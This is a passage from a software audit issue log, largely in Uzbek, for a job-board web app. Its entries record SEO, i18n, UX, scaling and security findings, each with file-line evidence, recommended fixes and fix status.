- **Recommended fix:** CHANGELOG'ga 0.4.0 yozuvini qo'shing: deploy'ni buzadigan va xavfsizlik o'zgarishlari (JWT 32+ belgi, CORS preview regex, web+API birga deploy, BILLING_ENABLED flag, sessiyalarni bekor qilish), maqolalar CMS, team takliflari va rejalashtirilgan auth modeli (A-L). README'ga db:demo, web test:unit, sitemap-articles.xml, /admin/articles, /admin/team va kontent rollarini qo'shing; scripts/*.py'ni legacy deb belgilang yoki olib tashlang.
- **Severity izohi:** Ikkala manba P3; ildizi bir xil: operator hujjatlari yangilanmagan. ISSUE-101 faqat scripts/*.py qismiga tegishli.
- **Manba topilmalar:** docs-18, docs-19
- **Bajarilgan fix:** docs-18: FIXED — CHANGELOG.md 0.4.0 | docs-19: FIXED — README: sitemap-articles.xml added, admin list completed (/admin/articles, /admin/team, recovery requests), commands extended (db:sync, test:auth, seed:demo, web test:unit), script
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-248

**og:image API host'idagi /api/og/... ga qaraydi, API'ning o'z robots.txt'i esa /api'ni Disallow qiladi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** seo/og
- **Fayl:** `apps/api/src/modules/seo/seo.routes.ts:46`
- **Root cause:** seoRoutes va ogRoutes bitta Fastify ilovasida ro'yxatdan o'tgan, shuning uchun API_URL/robots.txt 'Disallow: /api' qaytaradi. Vakansiya og:image'i `${API_URL}/api/og/vacancy/:slug`, ya'ni aynan taqiqlangan yo'l.
- **Impact:** robots.txt'ga amal qiladigan preview crawler'lar (Twitterbot, LinkedIn) dinamik rasmni o'tkazib yuboradi va ulashishda HeadDefault'dagi logo yoki rasmsiz ko'rinish chiqadi. Telegram preview bot'i robots.txt'ga amal qilishi tasdiqlanmagan (taxmin).
- **Evidence:** server.ts:238-239 `app.register(seoRoutes); app.register(ogRoutes);`; seo.routes.ts:46 `const lines = ["User-agent: *", "Disallow: /api"]`; og.routes.ts:7 `app.get("/api/og/vacancy/:slug"`; vacancies/@slug/+Head.tsx:121 `content={`${API_URL}/api/og/vacancy/${vacancy.slug}`}`; web lib/api.ts:37 API_URL = VITE_API_URL; HeadDefault.tsx:49 zaxira logo og:image.
- **Recommended fix:** API host'idagi robots.txt'da /api/og/ va /uploads/'ga ruxsat bering (`Allow: /api/og/` ni `Disallow: /api` dan oldin) yoki OG endpointni /og/vacancy/:slug kabi /api'dan tashqari yo'lga ko'chiring.
- **Severity izohi:** P2 -> P3: asosiy kanal Telegram'ning xatti-harakati tasdiqlanmagan va zaxira logo og:image bor.
- **Manba topilmalar:** seo-6
- **Bajarilgan fix:** seo-6: FIXED — robots.txt emits `Allow: /api/og/` before `Disallow: /api`, so the OG image path stays crawlable on the API host.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-249

**OG rasm endpointi har so'rovda satori+resvg bilan qayta chizadi, server kesh yo'q**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** seo/og-performance
- **Fayl:** `apps/api/src/modules/og/og.routes.ts:30`
- **Root cause:** Har GET DB so'rovi, to'liq SVG layout va PNG rasterizatsiya bajaradi. Faqat brauzer/CDN uchun Cache-Control max-age=3600 bor, Railway oldida esa CDN yo'q. Faqat global per-IP rate limit.
- **Impact:** Sotsial crawler'lar, katta Telegram guruhlaridagi unfurl'lar va slug'larni ketma-ket so'raydigan scraper'lar asosiy trafikni ham xizmat qiladigan yagona instansiyada CPU sarflaydi. 10k foydalanuvchida kichik, lekin oldini olsa bo'ladi.
- **Evidence:** og.routes.ts:7 `app.get("/api/og/vacancy/:slug"`, :30 `await renderVacancyOgImage(...)` har so'rovda; :42 `Cache-Control: public, max-age=3600`; server.ts:129 global rateLimit.
- **Recommended fix:** slug va updatedAt (yoki sarlavha/maosh hash) kalitli kichik LRU/TTL kesh qo'shing. Ixtiyoriy: route bo'yicha qattiqroq rate limit yoki CDN orqasiga qo'yish.
- **Severity izohi:** P3 saqlandi.
- **Manba topilmalar:** seo-16
- **Bajarilgan fix:** seo-16: FIXED — Rendered PNGs are cached for 30 minutes (50 entries) under slug+lang+updatedAt, so repeated crawler/unfurl hits no longer re-run satori+resvg. The DB lookup (indexed unique slug) s
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-250

**RU/EN son matnlarida ko'plik shakli hisobga olinmaydi ('1 кандидатов', '1 откликов', '1 candidates')**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** i18n/plurals
- **Fayl:** `apps/web/src/lib/i18n/messages.ru.ts:79`
- **Root cause:** Ba'zi son shablonlari n'ni qat'iy genitiv ko'plik (RU) yoki ko'plik (EN) otiga qo'shadi. ruPlural helper'i mavjud va boshqa joylarda ishlatiladi, bu yerda qo'llanmagan.
- **Impact:** Ish beruvchi nomzodlar sarlavhasida '1 кандидатов' / '1 candidates', vakansiya qatorlarida '1 откликов' / '1 applications' chiqadi. RU/EN ish beruvchilarga pala-partish ko'rinadi.
- **Evidence:** messages.ru.ts:79 `resultsCount: (n) => `${n} кандидатов``; ru:686 `${n} откликов` (VacancyRow.tsx:107,112); ru:864 `${n} вакансий`; messages.en.ts:78 `${n} candidates`, en:678, en:856; types.ts:2400 ruPlural.
- **Recommended fix:** RU shablonlarida ruPlural(n, ...), EN'da n === 1 ? birlik : ko'plik ishlating. ru/en fayllarida `(n) => `${n} ` naqshi uchun grep/lint tekshiruvi qo'shing.
- **Severity izohi:** P3 saqlandi.
- **Manba topilmalar:** i18n-8
- **Bajarilgan fix:** i18n-8: FIXED — ruPlural applied to candidates.resultsCount, employer applicationsCount and favorites.count in messages.ru.ts; n === 1 ? singular : plural applied to the same three in messages.en.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-251

**Vakansiya OG ulashish rasmi /ru va /en sahifalar uchun ham har doim o'zbekcha chiziladi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** i18n/og
- **Fayl:** `apps/api/src/common/format.ts:2`
- **Root cause:** formatSalaryLabel va OG route valyuta, qo'shimchalar, yashirin maosh yorlig'i va hudud fallback'ini o'zbekcha qattiq yozadi. Head og:image URL'ini tilsiz quradi, renderer lokallashtira olmaydi.
- **Impact:** Telegram va boshqa messenjerlarda ulashilgan RU/EN vakansiya havolasi 'so'm dan', 'Maosh ko'rsatilmagan' va o'zbekcha hudud nomi bilan ko'rinadi. Kichik, lekin asosiy ulashish kanalida ko'zga tashlanadi.
- **Evidence:** api common/format.ts:2 `cur = currency === "UZS" ? "so'm"`, :4 'Maosh ko'rsatilmagan', :6-7 `dan`/`gacha`; og.routes.ts:33 fallback "O'zbekiston"; web vacancies/@slug/+Head.tsx:121 og:image URL'ida til yo'q.
- **Recommended fix:** +Head.tsx'da og:image URL'iga ?lang=uz|ru|en qo'shing. og.routes yorliqlar va hudud nomini (slug bo'yicha) kichik uz/ru/en map'dan tanlasin; lang kesh kalitiga ham kirsin.
- **Severity izohi:** P3 saqlandi.
- **Manba topilmalar:** i18n-10
- **Bajarilgan fix:** i18n-10: PARTIAL — API side done: GET /api/og/vacancy/:slug?lang=uz|ru|en localises the salary label and the region fallback, lang is part of the cache key, and the default (uz) output is unchanged. 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-252

**Telefon gate'i faqat Ariza bosilgandan keyin ma'lum bo'ladi; gate havolasi profil umumiy sahifasiga olib boradi va vakansiya yo'qoladi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** ux/phone-gate
- **Fayl:** `apps/web/src/components/PhoneGateNotice.tsx:13`
- **Root cause:** Sessiya ma'lumotida telefon tasdig'i bayrog'i yo'q, apply hook uni yuklamaydi, gate eslatmasi esa umumiy /profile'ga havola beradi.
- **Impact:** Nomzod faol Ariza tugmasini ko'radi, 403 eslatmasini oladi, Telegram tab'i emas, profil umumiy ko'rinishiga tushadi va tasdiqlagandan keyin vakansiyaga qaytish yo'li yo'q.
- **Evidence:** PhoneGateNotice.tsx:13 `href={l("/profile")}`, ?tab=telegram va returnTo yo'q; useApplication.ts faqat fetchMyApplications va fetchResume yuklaydi, PHONE_NOT_VERIFIED faqat submit xatosida `setError({ kind: "phone" })`; getMe (auth.service.ts) isPhoneVerified qaytarmaydi.
- **Recommended fix:** useApplication'da /api/telegram/status'ni yuklang (yoki /api/auth/me'ga phoneVerified qo'shing) va gate'ni submit'dan oldin ko'rsating. Havolani /profile?tab=telegram va returnTo bilan bering, tasdiqlangach 'vakansiyaga qaytish' taklif qiling.
- **Severity izohi:** P3 saqlandi.
- **Manba topilmalar:** candidate-flows-14
- **Bajarilgan fix:** candidate-flows-14: PARTIAL — Gate link now goes to /profile?tab=telegram and carries a safe returnTo; after verification TelegramConnect shows a 'Back to the previous page' link. Detecting the gate before the 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-253

**Bildirishnomalar markazida faqat oxirgi 100 ta bildirishnomaga yetib boriladi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** scale/notifications
- **Fayl:** `apps/api/src/modules/notifications/notifications.routes.ts:22`
- **Root cause:** API'da maksimal limit bor, cursor yo'q. Web klient bitta 100 elementli javob ustida xotirada sahifalaydi.
- **Impact:** Obunalar va holat o'zgarishlari bilan faol nomzod tezda 100 dan oshadi va eski bildirishnomalar faqat 'kesilgan' degan izoh bilan yetib bo'lmaydigan bo'ladi.
- **Evidence:** notifications.routes.ts:22 `limit: z.coerce.number().int().min(1).max(100)`; :58-63 faqat take bilan findMany; lib/notifications/api.ts:4 izoh 'limit ≤ 100, sahifalash yo'q', :22 `?limit=${NOTIFICATIONS_LIMIT}`; NotificationsView.tsx:183 kesilgan izohi.
- **Recommended fix:** Mavjud [userId, createdAt] indeksi yordamida (createdAt, id) bo'yicha cursor sahifalash qo'shing va bildirishnomalar UI'si serverdan sahifalasin.
- **Severity izohi:** P3 saqlandi.
- **Manba topilmalar:** candidate-flows-16
- **Bajarilgan fix:** candidate-flows-16: FIXED — The notification center can reach every row through nextCursor; unreadCount still reflects all unread rows, not just the page.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-254

**Login'dagi 'Meni eslab qol' belgisi hech narsa qilmaydi; Apple tugmasi ishlamaydigan placeholder**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** ux/auth-polish
- **Fayl:** `apps/web/src/pages/login/+Page.tsx:76`
- **Root cause:** UI kontrollari backend yoki sessiya qo'llab-quvvatlashisiz qo'shilgan.
- **Impact:** Chalg'ituvchi xavfsizlik UI'si: belgi olib tashlansa ham 30 kunlik refresh cookie beriladi. Ko'rinib turgan Apple tugmasi faqat 'ulanmagan' deydi.
- **Evidence:** login/+Page.tsx:76-77 `checked={remember}` / setRemember, handleSubmit'da ishlatilmaydi; auth.routes.ts:49 `maxAge: 60 * 60 * 24 * 30` doim; SocialLogin.tsx:139-144 Apple ProviderButton `onClick={() => setSoon(true)}`.
- **Recommended fix:** Yoki amalga oshiring (belgi olinsa maxAge'siz session cookie), yoki checkbox'ni olib tashlang. Apple tugmasini qo'llab-quvvatlanguncha olib tashlang.
- **Severity izohi:** P3 saqlandi.
- **Manba topilmalar:** candidate-flows-17
- **Bajarilgan fix:** candidate-flows-17: PARTIAL — Remember-me removed (see auth-core-16). The Apple button was deliberately kept: the group task states 'keep Google and the Apple placeholder behaviour', so the placeholder note sta
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-255

**Admin vakansiya moderatsiyasi qidiruvi kompaniya relation filter'i va har qatorda _count ishlatadi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** scale/admin-moderation
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:241`
- **Root cause:** Admin matn qidiruvi OR [title contains, company {name contains}]. Kompaniya relation filter'i barcha vakansiyalar ustida $lookup bo'lib findMany va count'da ikki marta bajariladi, har qatorga _count.applications qo'shiladi.
- **Impact:** Vakansiyalar o'n minglarga yetganda moderatsiya qidiruvi sekinlashadi (har qidiruvda ikkita to'liq lookup skan). Faqat adminga ta'sir qiladi, benchmark qilinmagan (taxmin).
- **Evidence:** admin.routes.ts:239-243 `OR: [{ title: like(query.text) }, { company: { name: like(query.text) } }]`; :245-259 findMany + count, `_count: { select: { applications: true } }`; ommaviy qidiruvdagi tuzatilgan naqsh: vacancies.service.ts resolveFilterIds (D-033).
- **Recommended fix:** Avval kompaniya nomlarini ID'larga aylantiring (resolveFilterIds kabi), companyId in bilan filtrlang va _count o'rniga groupBy ishlating.
- **Severity izohi:** P2 -> P3: faqat admin, kam chastota, benchmark yo'q. ISSUE-048/D-033 dagi naqsh admin yo'liga qo'llanmagan.
- **Manba topilmalar:** employer-flows-12
- **Bajarilgan fix:** employer-flows-12: FIXED — Admin vacancy search resolves company ids first (bounded) and the per-row _count was replaced by one application groupBy over the page ids.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-256

**Ariza 'source' maydoni klient tomonidan boshqariladi, 'Telegram orqali' belgisini soxtalashtirish mumkin**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** data-integrity/applications
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:17`
- **Root cause:** applySchema nomzodga source 'telegram' yuborishga ruxsat beradi. Arizani hech bir Telegram oqimi yaratmaydi, yagona application.create shu route'da.
- **Impact:** Ish beruvchi ish maydonidagi 'Telegram orqali' belgisi va manba statistikasi ishonchsiz. Ta'sir kichik.
- **Evidence:** applications.routes.ts:17 `source: z.enum(["site", "telegram"]).default("site")`, :88 saqlanadi; ApplicationDetail.tsx:213-218 belgini chizadi; web lib/api.ts:206 doim 'site' yuboradi.
- **Recommended fix:** source'ni so'rov tanasidan olib tashlang va kanal bo'yicha serverda o'rnating.
- **Severity izohi:** P3 saqlandi.
- **Manba topilmalar:** employer-flows-20
- **Bajarilgan fix:** employer-flows-20: FIXED — `source` so'rov tanasidan olib tashlandi; server 'site' qo'yadi (sxema maydoni va eski ma'lumot o'zgarmadi, 'Telegram orqali' chipi faqat haqiqiy kanal uchun qoladi).
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-257

**Ro'yxatdan o'tish email mavjudligini oshkor qiladi (argon2'dan oldin 409)**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** auth/enumeration
- **Fayl:** `apps/api/src/modules/auth/auth.service.ts:40`
- **Root cause:** registerUser argon2 ishlashidan oldin 'Bu email bilan foydalanuvchi allaqachon mavjud' 409 ni qaytaradi, shuning uchun xabar ham, javob vaqti ham farq qiladi. Login'da bu muammo yo'q (noma'lum email uchun dummy hash).
- **Impact:** Foydalanuvchi bazasini email bo'yicha sanab chiqish mumkin, bu lockout, fishing va pre-account takeover nishonlarini tanlashga yordam beradi. Sekinlatuvchi IP limiti XFF bilan chetlab o'tiladi.
- **Evidence:** auth.service.ts:37-42 vs 90-99.
- **Recommended fix:** Agar bu savdo qabul qilinsa, register'ni ancha qattiqroq cheklang. Aks holda umumiy javob qaytaring va telefon/Telegram tasdiqi signup'ga kirganda tasdiq bosqichi orqali davom eting.
- **Severity izohi:** P3 saqlandi.
- **Manba topilmalar:** auth-core-14
- **Bajarilgan fix:** auth-core-14: PARTIAL — Timing is equalised (argon2 hash runs before the existence lookup) and registration is throttled per IP (30/hour) on top of the 10/min route limit. The 409 message still tells the 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-258

**Ish izlovchi har qanday kompaniya bilan suhbat ocha oladi va kompaniya egasining user ID'sini bilib oladi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** authz/chat-abuse
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:347`
- **Root cause:** conversations/start ning seeker tarmog'i faqat company slug'ni talab qiladi: faol vakansiya yoki munosabat talabi yo'q, akkaunt bo'yicha yaratish limiti yo'q. Suhbatlar ro'yxati suhbatdoshning xom user ID'sini qaytaradi.
- **Impact:** Bitta telefon tasdiqlangan seeker (tasdiq arzon, telefon issue'siga qarang) barcha kompaniya egalariga chat ochib xabar yuboradi. ISSUE-032 ochiq javoblardan olib tashlagan owner user ID oshkor bo'ladi va /api/users/:id/summary uni qabul qiladi.
- **Evidence:** chat.routes.ts:342-347 slug -> getOrCreateConversation(company.ownerUserId, me); :462 otherUserId; :603-615 summary istalgan suhbat bo'lsa ruxsat; server.ts:129-139 faqat global per-IP limit.
- **Recommended fix:** Akkaunt bo'yicha kunlik yangi suhbatlar sonini cheklang, ixtiyoriy ravishda faol vakansiya yoki oldingi ariza talab qiling. Xom user ID o'rniga suhbat doirasidagi handle qaytaring va summary'ni conversation ID bo'yicha oling.
- **Severity izohi:** P3 saqlandi. ISSUE-039 faqat employer tomonini tuzatgan; ISSUE-032 ownerUserId'ni ochiq javoblardan olib tashlagan.
- **Manba topilmalar:** authz-idor-10
- **Bajarilgan fix:** authz-idor-10: PARTIAL — New conversations are capped at 50/day per account (existing conversations are unaffected), a seeker cannot open a chat with a company whose owner is blocked, and an employer canno
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-259

**Yetim yuklangan fayllar hech qachon tozalanmaydi va ochiq qoladi (poyga, DB xatosi, saqlanmagan muqovalar, .part fayllar)**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** uploads/data-hygiene
- **Fayl:** `apps/api/src/modules/profile/profile.routes.ts:111`
- **Root cause:** Avval fayl saqlanadi, keyin oldingi URL o'qilib atomik bo'lmagan tarzda almashtiriladi. Ikki parallel yuklash bir xil oldingi URL'ni o'qiydi va bitta yangi fayl na havola qilinadi, na o'chiriladi. saveUpload'dan keyingi DB xatosi faylni qoldiradi. /api/admin/articles/cover DB yozuvisiz muqova saqlaydi. Vaqtinchalik .part fayl xizmat qilinadigan papkada. Sweeper yo'q.
- **Impact:** Railway volume'da vaqt o'tishi bilan disk o'sishi. Nomzod rezyumesini o'chirgandan keyin ham yetim PDF URL'ni bilgan har kimga ochiq qoladi.
- **Evidence:** profile.routes.ts:109-119 saveUpload -> findUnique previous -> upsert -> removeUploadedFile; companies.routes.ts:151-164 xuddi shu naqsh; articles.admin.routes.ts:290-291 faqat url qaytaradi; uploads.ts:77 temp UPLOAD_DIR ichida.
- **Recommended fix:** Vaqtinchalik fayllarni xizmat qilinmaydigan papkaga yozing. DB xatosida yangi faylni o'chiring. Upload kolleksiyasi (owner, prefix, createdAt, referenced) va 24 soatdan eski havolasiz fayllarni o'chiruvchi davriy sweep (demo- prefiksi va havola qilinganlarni whitelist). Almashtirishda compare-and-set ishlating.
- **Severity izohi:** P3 saqlandi. ISSUE-029/107 va D-013 almashtirishda o'chirishni tuzatgan; poyga va sweeper yo'qligi alohida.
- **Manba topilmalar:** files-xss-6
- **Bajarilgan fix:** files-xss-6: PARTIAL — Temp .part files and dot-files are no longer reachable through /uploads (404), and a DB failure right after a resume upload now unlinks the new file. An Upload collection with a pe
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-260

**Rasmlar baytma-bayt saqlanadi: EXIF/GPS metama'lumoti ochiq, piksel o'lchami cheklanmagan**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** WONT FIX
- **Area:** privacy/uploads
- **Fayl:** `apps/api/src/common/uploads.ts:106`
- **Root cause:** saveUpload faqat birinchi 16 baytni tekshiradi va asl stream'ni yakuniy nomga ko'chiradi. png/jpg/webp uchun decode/re-encode, metama'lumotni tozalash yoki kenglik/balandlik tekshiruvi yo'q.
- **Impact:** Taxmin: logo yoki maqola muqovasi sifatida yuklangan fotolar kamera va GPS EXIF'ini saqlaydi, u public va cross-origin beriladi. Juda katta o'lchamli 5MB PNG/WebP (decompression bomb) ochiq katalog va kompaniya sahifalarida mehmonlar brauzerini, ayniqsa mobilda, qotirishi mumkin.
- **Evidence:** uploads.ts:81 `pipeline(file.file, fs.createWriteStream(temp))`; :99 detectFileKind(head); :106 rename; companies.routes.ts:158 va articles.admin.routes.ts:290 png/jpg/webp.
- **Recommended fix:** Rasmlarni serverda qayta kodlang (masalan sharp: width*height > ~25MP rad etish, logoni ≤512px, muqovani ≤2000px, metama'lumotsiz WebP). PDF yo'li o'zgarmaydi.
- **Severity izohi:** P3 saqlandi, ishonch o'rtacha.
- **Manba topilmalar:** files-xss-7
- **Bajarilgan fix:** files-xss-7: WONT FIX — Stripping EXIF and capping pixel dimensions requires an image re-encoder (sharp); apps/api has no such dependency and new dependencies are forbidden this round. Recorded in needsOu
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-261

**Email HTML escaper qo'shtirnoqni escape qilmaydi, lekin href atributi ichida ishlatiladi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** security/xss-email
- **Fayl:** `apps/api/src/common/mailer.ts:83`
- **Root cause:** esc() faqat & < > ni almashtiradi, renderEmail esa esc(ctaHref) ni qo'shtirnoqli href ichiga qo'yadi. ctaHref safeInternalPath'dan o'tgan notification url'idan keladi, u boshqaruv belgilari va teskari chiziqni rad etadi, lekin qo'shtirnoqqa ruxsat beradi.
- **Impact:** Qo'shtirnoqli notification url (hozir admin broadcast url orqali yetib boriladi) chiquvchi email HTML'da atributdan chiqib, qo'shimcha atribut, uslub va fishing ko'rinishidagi markup qo'shadi. Email mijozlari JS ishlatmaydi, kirish hozircha faqat admin.
- **Evidence:** mailer.ts:64-66 `s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")`; :83 `<a href="${esc(ctaHref)}"`; validation.ts:32-35 faqat code<32, 127, 92 rad etiladi; admin.routes.ts:551.
- **Recommended fix:** esc() da " va ' ni ham escape qiling (&quot; va &#39;). Qo'shimcha: absoluteUrl'ning path qismini encodeURI qiling yoki safeInternalPath'da qo'shtirnoqni rad eting.
- **Severity izohi:** P3 saqlandi (faqat admin kiritmasi). ISSUE-098 escape'ni to'g'ri deb baholagan, bu bo'shliq qamrab olinmagan; ISSUE-054 broadcast url sanitizatsiyasi.
- **Manba topilmalar:** files-xss-9
- **Bajarilgan fix:** files-xss-9: FIXED — escapeHtml now escapes " and ' (it is used inside href="..."), and the text/plain generator re-opens &quot;/&#39;/&lt;/&gt;/&amp; so Uzbek text does not read 'bo&#39;yicha' in mail
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-262

**docker-compose autentifikatsiyasiz MongoDB va kalitsiz Meilisearch'ni barcha host interfeyslarida ochadi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** dev-infra
- **Fayl:** `docker-compose.yml:19`
- **Root cause:** Mongo --bind_ip_all bilan auth'siz ishlaydi va 27017:27017 ni publish qiladi. Meilisearch MEILI_ENV=development, master key'siz 7700:7700 da. Docker bu portlarni 0.0.0.0 da ochadi.
- **Impact:** Umumiy Wi-Fi'da LAN'dagi istalgan kishi dev bazani (auditlarda ishlatiladigan haqiqiy ma'lumot nusxalari bo'lishi mumkin) va qidiruv indeksini o'qiydi yoki yozadi. Faqat dev muhit.
- **Evidence:** docker-compose.yml:19 `command: ["--replSet", "rs0", "--bind_ip_all"]`; :20-21 "27017:27017"; :38-42 MEILI_ENV development, MEILI_MASTER_KEY yo'q, "7700:7700".
- **Recommended fix:** Portlarni 127.0.0.1 ga bog'lang ("127.0.0.1:27017:27017"), Mongo root credentials va MEILI_MASTER_KEY qo'ying.
- **Severity izohi:** P3 saqlandi (faqat dev).
- **Manba topilmalar:** headers-infra-16
- **Bajarilgan fix:** headers-infra-16: FIXED — docker-compose: Mongo va Meilisearch faqat 127.0.0.1 da
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-263

**Ta'sirli admin amallarida tasdiq yo'q yoki umumiy tasdiq**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** admin-staff/ux
- **Fayl:** `apps/web/src/pages/admin/companies/+Page.tsx:44`
- **Root cause:** Kompaniya tasdig'ini olib tashlashda confirm yo'q. Vakansiyani arxivlash va premium toggle'da confirm yo'q. Sharhni tasdiqlash/rad etishda confirm yo'q, o'chirishda sharh yoki kompaniyani aytmaydigan umumiy so'rov. Rol berish ham umumiy so'rov. RowButton'da disabled holati yo'q.
- **Impact:** Noto'g'ri bosish kompaniya tasdig'ini jimgina olib tashlaydi, jonli vakansiyani arxivlaydi yoki sharhni butunlay o'chiradi, audit yo'qligi sababli nima bo'lganini tiklab bo'lmaydi.
- **Evidence:** companies/+Page.tsx:44-48 toggleVerify confirm'siz; vacancies/+Page.tsx:185-192; reviews/+Page.tsx:140-152 `act(row, deleteAdminReview, true)`; users/+Page.tsx:47 t.admin.common.confirmAction; TeamList.tsx:43 va AdminArticleList.tsx:67-69 elementni nomlaydi.
- **Recommended fix:** Tasdiqni olish, arxivlash, sharh o'chirish va rol berish uchun TeamList/AdminArticleList naqshidagi nomli confirm'lar. RowButton'ga busyId'ga bog'langan disabled prop qo'shing.
- **Severity izohi:** P3 saqlandi.
- **Manba topilmalar:** admin-staff-12
- **Bajarilgan fix:** admin-staff-12: PARTIAL — Name-specific confirms added for company unverify, vacancy archive/approve/premium, review delete and payment confirm, plus reindex/alert sweep; RowButton now has a disabled state 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-264

**Qidiruv reindex'i qulfsiz HTTP so'rov ichida ishlaydi: parallel reindex yoki e'lon yangi hujjatlarni o'chirib yuborishi mumkin**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** admin-staff/maintenance
- **Fayl:** `apps/api/src/modules/search/search.service.ts:211`
- **Root cause:** POST /api/admin/search/reindex reindexAll'ni so'rov ichida kutadi, runAlertSweep'dagi kabi running bayrog'i yo'q. reindexAll faol id'lar snapshot'ini oladi, keyin shu snapshot'da bo'lmagan barcha indeks hujjatlarini o'chiradi.
- **Impact:** Skan paytida e'lon qilinib sinxronlangan vakansiya yoki boshqa admin/tabdan ikkinchi parallel reindex keyingi sinxronlashgacha Meilisearch'dan o'chirilishi mumkin (poyga taxmin). Katta reindex proxy timeout'idan oshishi mumkin.
- **Evidence:** search.service.ts:186-202 activeIds snapshot, :205-211 stale -> index.deleteDocuments(stale); admin.routes.ts:528 `async () => reindexAll()`.
- **Recommended fix:** Single-flight qulf qo'shing. Stale id'larni o'chirishdan oldin DB holatini qayta tekshiring (faqat faol bo'lmaganlarni o'chiring). Fon job sifatida 202 qaytarib, holatni overview'da ko'rsating.
- **Severity izohi:** P3 saqlandi, ishonch o'rtacha. ISSUE-126 cursor muammosini tuzatgan; poyga alohida.
- **Manba topilmalar:** admin-staff-13
- **Bajarilgan fix:** admin-staff-13: FIXED — reindexAll is single-flight (a concurrent call awaits the running task) and the "stale" id list is re-checked against the DB before deletion, so a vacancy published during the scan
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-265

**Hujjat va izohlar hali ham admin route'lari tokendagi rol bilan requireRole ishlatadi deydi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** admin-staff/docs
- **Fayl:** `apps/web/src/components/AdminShell.tsx:12`
- **Root cause:** AdminShell.tsx izohi /api/admin/* requireRole("admin") bilan himoyalangan deydi, API_MAP.md esa admin route'lari tokendagi rolga ishonadi deydi. Kod aslida requireAuth + requireStaff("admin") ishlatadi va rolni DB'dan o'qiydi.
- **Impact:** Kelajakdagi avtorizatsiya review va fix'larini chalg'itadi.
